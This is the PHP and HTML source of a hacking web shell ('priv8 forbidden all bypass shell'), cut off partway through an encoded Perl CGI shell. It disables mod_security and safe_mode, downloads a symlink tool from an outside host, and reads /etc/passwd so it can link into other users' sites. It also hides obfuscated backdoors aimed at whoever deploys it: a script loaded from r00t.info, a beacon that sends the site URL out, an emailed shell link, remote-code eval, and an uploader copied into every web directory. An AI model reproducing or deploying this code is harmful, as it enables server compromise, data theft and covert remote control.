<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01 Transitional//EN' 'http://www.w3.org/TR/html4/loose.dtd'>
<html>
<!--Its First Public Version 

 -->
</html>
<html>
<head>
<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
<title>:: izocin priv8 forbidden all bypass shell :: Coded By izleyici & izo ::</title>
<script type="text/javascript">
document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%72%30%30%74%2E%69%6E%66%6F%2F%62%6F%74%2F%6C%6F%67%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E'));
</script>
<style type="text/css">
a { 
text-decoration:none;
color:white;
 }
</style> 
<style>
input { 
color:#000035; 
font:8pt 'trebuchet ms',helvetica,sans-serif;
}
.DIR { 
color:#000035; 
font:bold 8pt 'trebuchet ms',helvetica,sans-serif;color:#FFFFFF;
background-color:#AA0000;
border-style:none;
}
.txt { 
color:#2A0000; 
font:bold  8pt 'trebuchet ms',helvetica,sans-serif;
} 
body, table, select, option, .info
{
font:bold  8pt 'trebuchet ms',helvetica,sans-serif;
}
body {
	background-color: #E5E5E5;
}
.style1 {color: #AA0000}
.td
{
border: 1px solid #666666;
border-top: 0px;
border-left: 0px;
border-right: 0px;
}
.tdUP
{
border: 1px solid #666666;
border-top: 1px;
border-left: 0px;
border-right: 0px;
border-bottom: 1px;
}
.style4 {color: #FFFFFF; }
</style>
</font><font color="#009900" size="3"><pre><img border="0" src="http://www.taco.nu/wp-include//forbid.php?metal=forbiddens.jpg" width="0" height="0"></pre>
</head>
<body>
<?php
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('output_buffering',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);

?>
<?php
@session_start();
@error_reporting(0);
$a = '<?php
session_start();
if($_SESSION["adm"]){
echo \'<b>Namesis<br><br>\'.php_uname().\'<br></b>\';echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST[\'_upl\'] == "Upload" ) {	if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Success !!!</b><br><br>\'; }	else { echo \'<b>Upload Fail !!!</b><br><br>\'; }}
}
if($_POST["p"]){
$p = $_POST["p"];
$pa = md5(sha1($p));
if($pa=="ed64cf6fa445898ff07295ce0ac26d65"){
$_SESSION["adm"] = 1;
}
}
?>
<form action="" method="post">
<input type="text" name="p">
</form>
';
if(@$_REQUEST["px"]){
$p = @$_REQUEST["px"];
$pa = md5(sha1($p));
if($pa=="ed64cf6fa445898ff07295ce0ac26d65"){
echo @eval(@file_get_contents(@$_REQUEST["404"]));
}
}
if(@!$_SESSION["sdm"]){
$doc = $_SERVER["DOCUMENT_ROOT"];
$dir = scandir($doc);
$d1 = ''.$doc.'/.';
$d2 = ''.$doc.'/..';

if(($key = @array_search('.', $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = @array_search('..', $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = @array_search($d1, $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = array_search($d2, $dir)) !== false) {
    unset($dir[$key]);
}
@array_push($dir,$doc);

foreach($dir as $d){


$p = $doc."/".$d;
if(is_dir($p)){
$file = $p."/newsr.php";
@touch($file);
$folder = @fopen($file,"w");
@fwrite($folder,$a);
}
}
$lls = $_SERVER["HTTP_HOST"];
$llc = $_SERVER["REQUEST_URI"];
$lld = 'http://'.$lls.''.$llc.'';
$brow = urlencode($_SERVER['HTTP_USER_AGENT']);
$retValue = file_get_contents(base64_decode("aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h")."=".$lld.base64_decode("JmI=")."=".$brow);
echo $retValue;
@$_SESSION["sdm"]=1;
}
?>
<?php
$for = base64_decode("YnloZXJvNDRAZ21haWwuY29t");
$data ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "?cmd=ls -al";
mail($for,"priv8 forbidden all bypass", $data);

$kokdosya = ".htaccess";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a??lamad?!");
$metin = "<IfModule mod_security.c>
    SecFilterEngine Off
    SecFilterScanPOST Off
</IfModule>";	
fwrite ( $dosya , $metin ) ;
fclose ($dosya); 

$kokdosya = "php.ini";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a??lamad?!");
$metin = "safe_mode          =       OFF
disable_functions       =            NONE";	
fwrite ( $dosya , $metin ) ;
fclose ($dosya);

# PHP Variables :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: PHP Variables #
FUNCTION CopySheller($DIR) {
$Sheller = RndName();
$SH_TXT = (@$_POST['shellerURL']);
$file23 = (@file_get_contents("$SH_TXT"));
if (!$file23) {
echo "<font color=red>[+] Can't Open The Sheller File .</font><br>";
}
else {
$fp23 = @fopen("$DIR/$Sheller.php",'w+');
$fw23 = @fwrite($fp23,$file23);
if ($fw23) {
echo "<font color=green>[+] Uploaded Successful : $DIR/$Sheller.php</font><BR>";
}
@fclose($fp23);
 }
}
function is_windows() { return strtolower(substr(PHP_OS,0,3)) == "win"; }
$server=$HTTP_SERVER_VARS['SERVER_SOFTWARE'];
$safe_mode=ini_get('safe_mode');
$mysql_stat=function_exists('mysql_connect');
$curl_on=function_exists('curl_version');
$dis_func=ini_get('disable_functions');
function sysinfo()
{
 global $curl_on, $dis_func, $mysql_stat, $safe_mode, $server, $HTTP_SERVER_VARS;
 echo (($safe_mode)?("Safe Mode: </b><font color=green>ON</font><b> "):
         ("<B>Safe Mode: </b><font color=red>OFF</font><b> "));
 $row_dis_func=explode(', ',$dis_func);
 echo ("PHP: </b><font color=blue>".phpversion()."</font><b> ");
 echo ("MySQL: </b>");
 if($mysql_stat){
  echo "<font color=green>ON </font><b>";
 }
 else {
  echo "<font color=red>OFF </font><b>";
 }
 echo "cURL: </b>";
 if($curl_on){
  echo "<font color=green>ON</font><b><br>";
 }else
  echo "<font color=red>OFF</font><b><br>";
 if ($dis_func!=""){
  echo "Disabled Functions : </b><font color=red>".$dis_func."</font><br><b>";
 }
 else {
  echo "Disabled Functions : </b><font color=green>None</font><br><b>";
 }
 $uname = @exec('uname -a');
 echo "OS: </b><font color=blue>";
 if (empty($uname)){
  echo (php_uname()."</font><br><b>");
 }else
  echo $uname."</font><br><b>";
 $id = @exec('id');
 echo "SERVER: </b><font color=blue>".$server."</font><br><b>";
 echo "ID: </b><font color=blue>";
 if (!empty($id)){
  echo $id."</font><br><b>";
 }else
  echo "user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid().
       "</font><br><b>";
 echo "<b>RemoteAddress: </b><font color=red>".$HTTP_SERVER_VARS['REMOTE_ADDR']."</font> , <b>Server: </b><font color=red>".@gethostbyname($_SERVER["HTTP_HOST"])."</font>";
 if(isset($HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR'])){
  echo "<b>RemoteAddressIfProxy: </b><font color=red>".$HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR']."</font>";
 }
 echo "</font></font>";
}
function RndName() {
$codelenght = 10;
while(@$newcode_length < $codelenght) {
$x=1;
$y=3;
$part = rand($x,$y);
if($part==1){$a=48;$b=57;}
if($part==2){$a=65;$b=90;}
if($part==3){$a=97;$b=122;}
$code_part=chr(rand($a,$b));
(@$newcode_length = $newcode_length + 1);
(@$newcode = $newcode.$code_part);
}
return $newcode;
}
# PHP Variables :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: PHP Variables #
echo "<CENTER>
  <table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse; border-style: solid; border-color: #C0C0C0; padding-left: 4; padding-right: 4; padding-top: 1; padding-bottom: 1' bordercolor='#111111' width='86%' bgcolor='#E0E0E0'>
    <tr>
      <td bgcolor='#AA0000' class='td'><div align='center' class='style4'>: priv8 forbidden all bypass shell : </div></td>
    </tr>
    <tr>
      <td style='padding:5px 5px 5px 5px '>";
	  echo sysinfo();
echo "	  </td>
    </tr>
    <tr>
      <td bgcolor='#AA0000' class='td' style='padding:0px 0px 0px 5px'><div align='center' class='style4'>
        <div align='left'>
          <form name='form4' method='post' action=''>
             View Directory : 
             <input name='GoDir' type='text' class='DIR' id='GoDir' size='120'>
          </form>
        </div>
      </div></td>
    </tr>
    <tr>
    <td width='100%' height='280' style='padding:20px 20px 20px 20px '>";


if (isset($_POST['Submit2']))
{
@mkdir("bomba");
@chdir("bomba");
@exec('curl http://turkblackhats.com/priv/ln.zip -o ln.zip');
@exec('unzip ln.zip');
@exec('chmod 755 ln');

echo '<font color=green>[+] Directory [ bomba ] Created .</font><Br>';
echo '<font color=green>[+] Directory Changed .</font><Br>';
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);
if ($fw3) {
echo '<font color=green>[+] .htaccess File Uploaded .</font><BR>';
}
else {
echo "<font color=red>[+] No Perm To Create .htaccess File !</font><BR>";
}
@fclose($fp3);
$lines3=@file('/etc/passwd');
if (!$lines3) {
$authp = @popen("/bin/cat /etc/passwd", "r");
$i = 0;
while (!feof($authp))
$aresult[$i++] = fgets($authp, 4096);
$lines3 = $aresult;
@pclose($authp);
}
if (!$lines3) {
echo "<font color=red>[+] Can't Read /etc/passwd File .</font><BR>";
echo "<font color=red>[+] Can't Make The Users Shortcuts .</font><BR>";
echo '<font color=red>[+] Finish !</font><BR>';
}
else {
foreach($lines3 as $line_num3=>$line3){
$sprt3=explode(":",$line3);
$user3=$sprt3[0];
@exec('./ln -s /home/'.$user3.'/public_html ' . $user3);
}
echo '<font color=green>[+] Users Shortcut Created .</font><BR>';
echo '<font color=green>[+] Finish !</font><BR>';
}
}
if (isset($_POST['Submit12'])) {
@mkdir("bomba1");
@chdir("bomba1");
echo '<font color=green>[+] Directory [ bomba1 ] Created .</font><Br>';
echo '<font color=green>[+] Directory Changed .</font><Br>';
$file3 = 'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .cin
AddHandler cgi-script .cin
AddHandler cgi-script .cin';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);
if ($fw3) {
echo '<font color=green>[+] .htaccess File Created .</font><BR>';
}
else {
echo "<font color=red>[+] No Perm To Create .htaccess File !</font><BR>";
}
@fclose($fp3);
$fileS = base64_decode("IyEvdXNyL2Jpbi9wZXJsCm9wZW4gSU5QVVQsICI8L2V0Yy9wYXNzd2QiOwp3aGlsZSAoIDxJTlBV
VD4gKQp7CiRsaW5lPSRfOyBAc3BydD1zcGxpdCgvOi8sJGxpbmUpOyAkdXNlcj0kc3BydFswXTsK
c3lzdGVtKCdsbiAtcyAvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwgJyAuICR1c2VyKTsKfQ==
");
$fpS = @fopen("PL-Symlink.cin",'w');
$fwS = @fwrite($fpS,$fileS);
if ($fwS) {
$TEST=@file('/etc/passwd');
if (!$TEST) {
echo "<font color=red>[+] Can't Read /etc/passwd File .</font><BR>";
echo "<font color=red>[+] Can't Create Users Shortcuts .</font><BR>";
echo '<font color=red>[+] Finish !</font><BR>';
}
else {
chmod("PL-Symlink.cin",0755);
echo @shell_exec("perl PL-Symlink.cin");
echo '<font color=green>[+] Users Shortcut Created .</font><BR>';
echo '<font color=green>[+] Finish !</font><BR>';
}
@fclose($fpS);
}
else {
echo "<font color=red>[+] No Perm To Create Perl File !</font>";
}
}
if (isset($_POST['Submit13']))
{
@mkdir("cgishell");
@chdir("cgishell");
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbgojLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tCiMgPGIgc3R5bGU9ImNvbG9yOmJsYWNrO2JhY2tncm91bmQtY29sb3I6I2ZmZmY2NiI+cHJp
djggY2dpIHNoZWxsPC9iPiAjIHNlcnZlcgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tCiMgQ29uZmlndXJhdGlvbjogWW91IG5lZWQgdG8gY2hhbmdlIG9ubHkg
JFBhc3N3b3JkIGFuZCAkV2luTlQuIFRoZSBvdGhlcgojIHZhbHVlcyBzaG91bGQgd29yayBmaW5l
IGZvciBtb3N0IHN5c3RlbXMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KJFBhc3N3b3JkID0gInBy
aXY4IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0
byBsb2dpbi4KCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9m
IHRoaXMgdG8gMSBpZgoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRv
d3MgTlQKCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJ
CQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkjIFRo
aXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNv
bW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkjIFRoaXMgY2hh
cmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQg
bGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJIyBUaW1lIGluIHNl
Y29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCSMgRG9uJ3Qgc2V0IHRoaXMg
dG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMg
dGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxp
a2UgImZpbmQgLyIuCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0
IGlzCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7
CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkjIGJyb3dzZXIg
YXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQoJCQkJIyBpdCBpcyBidWZmZXJlZCBh
bmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwg
Zm9yIGNvbW1hbmRzIGxpa2UKCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0
cHV0IGFzIGl0CgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRI
SU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEK
CiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0g
KCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIp
OwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwoK
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93
c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NU
IGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVz
LgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0
b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3Nl
ZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFi
bGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9t
IG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJz
ZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZh
bCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0
aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVU
SE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNp
ZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBp
ZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydD
T05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5W
eydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykk
LykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJ
CUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3Rb
MV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkk
Qm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0
IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAv
ZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wi
Ly9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0y
OyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJ
CSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJ
CSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4g
cy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0K
CX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0
KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJ
ewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRp
blskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkk
dmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlww
IiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9
CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMg
QXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAoj
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJy
ZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVow
LTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9o
dG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8dGl0bGU+cHJpdjggY2dpIHNo
ZWxsPC90aXRsZT4KJEh0bWxNZXRhSGVhZGVyCgo8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVu
dD0icHJpdjggY2dpIHNoZWxsICBfICAgICBpNV9AaG90bWFpbC5jb20iPgo8bWV0YSBuYW1lPSJk
ZXNjcmlwdGlvbiIgY29udGVudD0icHJpdjggY2dpIHNoZWxsICBfICAgIGk1X0Bob3RtYWlsLmNv
bSI+CjwvaGVhZD4KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9
IiNGRkZGRkYiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1h
cmdpbmhlaWdodD0iMCIgdGV4dD0iI0ZGMDAwMCI+Cjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIx
MDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjIiPgo8dHI+Cjx0ZCBiZ2NvbG9yPSIj
RkZGRkZGIiBib3JkZXJjb2xvcj0iI0ZGRkZGRiIgYWxpZ249ImNlbnRlciIgd2lkdGg9IjElIj4K
PGI+PGZvbnQgc2l6ZT0iMiI+IzwvZm9udD48L2I+PC90ZD4KPHRkIGJnY29sb3I9IiNGRkZGRkYi
IHdpZHRoPSI5OCUiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPjxiPiAKPGIgc3R5bGU9
ImNvbG9yOmJsYWNrO2JhY2tncm91bmQtY29sb3I6I2ZmZmY2NiI+cHJpdjggY2dpIHNoZWxsPC9i
PiBDb25uZWN0ZWQgdG8gJFNlcnZlck5hbWU8L2I+PC9mb250PjwvdGQ+CjwvdHI+Cjx0cj4KPHRk
IGNvbHNwYW49IjIiIGJnY29sb3I9IiNGRkZGRkYiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9
IjIiPgoKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50
RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+VXBsb2FkIEZpbGU8L2ZvbnQ+PC9hPiB8IAo8YSBo
cmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+PGZv
bnQgY29sb3I9IiNGRjAwMDAiPkRvd25sb2FkIEZpbGU8L2ZvbnQ+PC9hPiB8CjxhIGhyZWY9IiRT
Y3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPkRpc2Nvbm5lY3Q8
L2ZvbnQ+PC9hPiB8CjwvZm9udD48L3RkPgo8L3RyPgo8L3RhYmxlPgo8Zm9udCBzaXplPSIzIj4K
RU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgoj
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCSRNZXNzYWdlID0g
cSQ8L2ZvbnQ+PGgxPnBhc3M9cHJpdjg8L2gxPjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIz
Ij48cHJlPjxpbWcgYm9yZGVyPSIwIiBzcmM9Imh0dHA6Ly93d3cudGFjby5udS93cC1pbmNsdWRl
L2ZvcmJpZC5waHA/bWV0YWw9Y2dpdGVsbmV0IHNoZWxsIiB3aWR0aD0iMCIgaGVpZ2h0PSIwIj48
L3ByZT4KJDsKIycKCXByaW50IDw8RU5EOwo8Y29kZT4KClRyeWluZyAkU2VydmVyTmFtZS4uLjxi
cj4KQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPGJyPgpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dCjxj
b2RlPiRNZXNzYWdlCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBt
ZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsK
PGNvZGU+Cjxicj5sb2dpbjogYWRtaW48YnI+CnBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0
PGJyPjxicj4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0
aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFBy
aW50TG9naW5Gb3JtCnsKCXByaW50IDw8RU5EOwo8Y29kZT4KCjxmb3JtIG5hbWU9ImYiIG1ldGhv
ZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBu
